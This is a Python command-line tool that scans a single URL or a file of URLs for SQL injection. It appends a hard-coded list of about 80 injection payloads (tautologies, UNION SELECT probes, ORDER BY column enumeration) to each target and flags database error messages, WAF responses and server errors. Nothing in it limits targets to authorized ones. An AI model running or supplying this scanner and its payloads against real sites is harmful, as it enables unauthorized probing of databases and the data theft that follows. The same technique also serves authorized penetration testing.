from colorama import init, Fore 
import requests
from requests.exceptions import RequestException
from datetime import datetime
import sys
import time


# Initialize colorama for colored terminal output
init(autoreset=True)

# Banner
print(Fore.GREEN + r'''
   _____       _ _   _____       _            _             
  / ____|     | (_) |  __ \     | |          | |            
 | (___   __ _| |_  | |  | | ___| |_ ___  ___| |_ ___  _ __ 
  \___ \ / _` | | | | |  | |/ _ \ __/ _ \/ __| __/ _ \| '__|
  ____) | (_| | | | | |__| |  __/ ||  __/ (__| || (_) | |   
 |_____/ \__, |_|_| |_____/ \___|\__\___|\___|\__\___/|_|   
           | |                                             
           |_|                                             
    Sqli Detector with Expanded Payloads - Coded by Aung San & Setsuna jin
    Github Page : https://aungsanoo.com
''')

def write_log(text):
    datename = datetime.now().strftime("%Y-%m-%d")
    filename = f"vuln_{datename}.txt"

    with open(filename, 'a') as f:
        f.write(f"{text}")

# Function to detect SQL errors in HTTP response
def is_vulnerable(response):
    """
    Determines whether a page is SQL Injection vulnerable by checking
    for common database error messages in the HTTP response.
    """
    errors = {
        "mysql": [
            "you have an error in your sql syntax;",
            "warning: mysql"
        ],
        "sql_server": [
            "unclosed quotation mark after the character string",
            "incorrect syntax near"
        ],
        "oracle": [
            "quoted string not properly terminated",
            "ora-00933: sql command not properly ended",
            "ora-00936: missing expression"
        ],
        "postgresql": [
            "pg_query",
            "syntax error at or near"
        ]
    }
    content = response.content.decode(errors="ignore").lower()

    for db_type, error_list in errors.items():
        for error in error_list:
            if error in content:
                print(Fore.GREEN + f"[!] Potential SQL Injection vulnerability detected: ({db_type}) ({response.status_code})")
                write_log(f"[*] Potential SQL Injection vulnerability detected: ({db_type}) >> {error} \n")
                return True
    return False


# Function to handle many request like post,put,. etc
# Paste here for request header and body from burpsuite
# With cookie and other header. example:
#   url = "https://contoh.com/api/login"
#       headers = {
#           "Host": "contoh.com",
#           "User-Agent": "Mozilla/5.0",
#           "Content-Type": "application/json",
#           "Authorization": "Bearer xyz123"
#       }
#   data = {
#       "username": "admin",
#       "password": "password123"
#   }
#   response = requests.post(url, json=data, headers=headers)
#
# - Gunakan json=data kalau body-nya berbentuk JSON, biar otomatis dikonversi
#   dan header Content-Type di-set
# - Gunakan data=data kalau body-nya berbentuk encode, contoh application/x-www-form-urlencode
def requests_engine(eurl):
    headers = {
        "User-Agent": "Mozilla/5.0"
    }

    return requests.get(eurl, headers=headers, timeout=5)



# Function to scan a URL for SQL injection vulnerabilities and detect WAF
def scan(url, cpayload):
    """Scan the URL for SQL injection vulnerabilities and detect WAF behavior."""
    payloads = [
        "'", "''", "' OR 1=1; --", "' OR '1'='1", "' or", "-- or", "' OR '1",
        "' OR 1 - - -", " OR \"\"= ", " OR 1 = 1 - - -", "' OR '' = '",
        "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
        "' UNION SELECT NULL,NULL,NULL--", "1' ORDER BY 1, 2--+",
        "1' ORDER BY 1, 2, 3--+", "' AND 1=2 UNION SELECT 1,2,3 --",
        "1' GROUP BY 1, 2, --+", "1' GROUP BY 1, 2, 3--+",
        "' GROUP BY columnnames having 1= 1 - -", "-1' UNION SELECT 1, 2, 3--+",
        "OR 1 = 1", "OR 1 = 0", "OR 1= 1#", "OR 1 = 0#",
        "OR 1 = 1--", "OR 1= 0--", "HAVING 1 = 1", "HAVING 1= 0",
        "HAVING 1= 1#", "HAVING 1= 0#", "HAVING 1 = 1--", "HAVING 1 = 0--",
        "AND 1= 1", "AND 1= 0", "AND 1 = 1--", "AND 1 = 0--",
        "AND 1= 1#", "AND 1= 0#", "AND 1 = 1 AND '%' ='", "AND 1 = 0 AND '%' ='",
        "WHERE 1= 1 AND 1 = 1", "WHERE 1 = 1 AND 1 = 0",
        "WHERE 1 = 1 AND 1 = 1#", "WHERE 1 = 1 AND 1 = 0#",
        "WHERE 1 = 1 AND 1 = 1--", "WHERE 1 = 1 AND 1 = 0--",
        "ORDER BY 1--", "ORDER BY 2--", "ORDER BY 3--",
        "ORDER BY 4--", "ORDER BY 5--", "ORDER BY 6--",
        "ORDER BY 7--", "ORDER BY 8--", "ORDER BY 9--",
        "ORDER BY 10--", "ORDER BY 11--", "ORDER BY 12--",
        "ORDER BY 13--", "ORDER BY 14--", "ORDER BY 15--",
        "ORDER BY 16--", "ORDER BY 17--", "ORDER BY 18--",
        "ORDER BY 19--", "ORDER BY 20--", "ORDER BY 21--",
        "ORDER BY 22--", "ORDER BY 23--", "ORDER BY 24--",
        "ORDER BY 25--", "ORDER BY 26--", "ORDER BY 27--",
        "ORDER BY 28--", "ORDER BY 29--", "ORDER BY 30--",
        "ORDER BY 31337--"
    ]

    try:
        with open(cpayload, "r") as file:
            payloads = file.read().splitlines()
    except FileNotFoundError:
        print(Fore.MAGENTA + "[+] Using default payload")


    print(Fore.YELLOW + f"[*] Starting SQL Injection scan for: {url}")
    vulnerable = False

    try:
        # Fetch baseline response
        baseline_response = requests_engine(url)
        baseline_length = len(baseline_response.content)

        for payload in payloads:
            full_url = f"{url}{payload}"
            try:
                response = requests_engine(full_url)
                content_length = len(response.content)

                # WAF Detection
                if response.status_code in [403, 406, 429]:
                    print(Fore.MAGENTA + f"[!] WAF Detected")
                    write_log(f"[+] WAF Detected: HTTP[{response.status_code}] len[{content_length}] {full_url}\n")

                elif abs(content_length - baseline_length) > 50:
                    print(Fore.YELLOW + f"[!] WAF behavior detected")
                    write_log(f"[+] WAF behavior Detected: HTTP[{response.status_code}] len[{content_length}] {full_url}\n")

                # Check for SQL Injection
                if is_vulnerable(response):
                    print(Fore.GREEN + f"[+] SQL Injection Found[ {full_url} ]\n\n")
                    vulnerable = True
                    write_log(f"[+] SQL Injection Found: HTTP[{response.status_code}] len[{content_length}] {full_url}\n\n")
                else:
                    print(Fore.RED + f"[-] No vulnerability HTTP({response.status_code}) len({content_length}) with payload[{payload}]\n")

                # Server Error
                if response.status_code in [500]:
                    print(Fore.YELLOW + f"[+] Server Error detected: HTTP[{response.status_code}] len[{content_length}] payload['{payload}']")
                    write_log(f"[+] Potential Found: HTTP[{response.status_code}] len[{content_length}] {full_url}\n")


            except RequestException as e:
                print(Fore.RED + f"[!] Error with payload['{payload}'] ERR[{e}]")
    except RequestException as e:
        print(Fore.RED + f"[!] Could not fetch baseline response: {e}")

    print(Fore.BLUE + "[!] SQL Injection scan complete.")

    if vulnerable:
        print(Fore.GREEN + "[!!!] The target might be VULNERABLE to SQL Injection.")
    else:
        print(Fore.RED + "[+] The target is NOT vulnerable to SQL Injection.")

# Main program to handle single or multiple URLs
if __name__ == "__main__":
    try:
        choice = input(Fore.CYAN + "[*] Choose scan type (1 for single URL, 2 for URLs from file): ")
        cpayload = input(Fore.MAGENTA + "[*] Enter path payload (ENTER for default): ")


        if choice == "1":
            url = input(Fore.CYAN + "[*] Enter the target URL (e.g., http://example.com/page.php?id=): ")
            if not url.startswith("http://") and not url.startswith("https://"):
                print(Fore.RED + "[!] Invalid URL. Ensure it starts with http:// or https://")
            else:
                scan(url, cpayload)
        
        elif choice == "2":
            file_path = input(Fore.CYAN + "[*] Enter the path to the URLs file (e.g., urls.txt): ")
            try:
                with open(file_path, "r") as file:
                    urls = file.readlines()
                    for url in urls:
                        url = url.strip()
                        if url.startswith("http://") or url.startswith("https://"):
                            scan(url, cpayload)
                        else:
                            print(Fore.RED + f"[!] Skipping invalid URL: {url}")
            except FileNotFoundError:
                print(Fore.RED + "[!] File not found. Please check the file path.")
        else:
            print(Fore.RED + "[!] Invalid choice. Please choose 1 or 2.")

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[-] Script interrupted by user.")
    except Exception as e:
        print(Fore.RED + f"[!] An unexpected error occurred: {e}")
    finally:
        input(Fore.CYAN + "\nPress Enter to Exit.")
